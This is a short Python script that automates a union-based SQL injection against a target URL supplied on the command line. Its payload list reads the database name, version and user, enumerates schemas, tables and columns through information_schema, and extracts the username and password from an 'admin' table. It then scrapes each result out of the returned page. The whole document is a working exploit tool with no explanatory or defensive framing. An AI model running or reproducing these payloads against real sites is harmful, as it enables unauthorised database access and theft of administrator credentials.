#!usr/bin/env python
#coding=utf8

import requests
import re
import sys


def main(argv):
  if(len(argv) != 2):
    print ("Usage: " +sys.argv[0] + "<URL>")
    sys.exit(0)

  else:
    url = argv[1]
    all_payload = [#"?id=1 order by 1--+",
                   #"?id=1 and 1=2 union select 1,2--+",
                   "?id=1 and 1=2 union select 1,database()--+",
                   "?id=1 and 1=2 union select 1,version()--+",
                   "?id=1 and 1=2 union select 1,user()--+",
                   "?id=1 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1",
                   "?id=1 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1",
                   "?id=1 and 1=2 union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x"+
                   str_to_hex("maoshe")+" limit 1,1",
                   "?id=1 and 1=2 union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x"+
                                     str_to_hex("maoshe")+" limit 1,1",                  
                   "?id=1 and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x"+
                   str_to_hex("maoshe"),
                   "?id=1 and 1=2 union select 1,group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_NAME=0x"+str_to_hex("admin"),
                   "?id=1 and 1=2 union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x"+str_to_hex("admin")+" limit 0,1", 
                   "?id=1 and 1=2 union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x"+str_to_hex("admin")+" limit 1,1",
                   "?id=1 and 1=2 union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x"+str_to_hex("admin")+" limit 2,1",
                   "?id=1 and 1=2 union select 1,group_concat(distinct id) from admin",
                   "?id=1 and 1=2 union select 1,username from admin t where t.id=1",
                   "?id=1 and 1=2 union select 1,password from admin t where t.id=1",
                   ]
    for payload in all_payload:
      exp = url + payload
      r = requests.get(exp)
      #print(r.text)
      print re.findall(r"class=\"content\">\n(.*?)  </div>", r.text,re.S)


def str_to_hex(s):
  return ''.join([hex(ord(c)).replace('0x','') for c in s])

if __name__ == '__main__':
  main(sys.argv)